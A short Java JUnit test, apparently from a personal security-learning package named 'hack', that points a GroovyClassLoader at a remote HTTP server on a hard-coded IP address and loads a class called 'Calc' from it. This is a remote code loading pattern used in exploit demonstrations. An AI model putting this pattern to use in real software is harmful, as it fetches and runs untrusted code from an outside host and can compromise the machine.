package com.xjjlearning.hack.java;

import groovy.lang.GroovyClassLoader;
import org.junit.Test;

/**
 * Created by xjj on 2023/3/18.
 */
public class GroovyClassLoaderTest {
    @Test
    public void f() throws ClassNotFoundException {
        GroovyClassLoader loader = new GroovyClassLoader();
        loader.addClasspath("http://47.95.7.37:9870/");
        loader.loadClass("Calc");
    }
}
